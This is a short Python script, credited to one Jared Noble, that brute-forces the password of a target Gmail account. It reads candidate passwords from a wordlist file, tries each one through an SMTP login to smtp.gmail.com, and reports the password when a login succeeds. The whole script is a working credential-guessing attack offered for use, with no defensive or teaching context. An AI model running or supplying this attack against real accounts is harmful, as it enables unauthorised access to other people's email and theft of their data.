#Author Jared Noble

import smtplib

 
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()

tlsCheck = 0

tlsCheck = input("Does this server use TLS? y/n: ")
if tlsCheck == "y":
	tlsCheck = 1
	smtpserver.starttls()

 
user = input("Enter target email: ")
pFile = input("Enter the password file name: ")
pFile = open(pFile, "r")
 
for password in pFile:
        try:
                smtpserver.login(user, password)
                print("[+] Password Found: %s" % password)
                break;
        except smtplib.SMTPAuthenticationError:
        	print("[!] Password Incorrect: %s" % password)
smtpserver.quit()
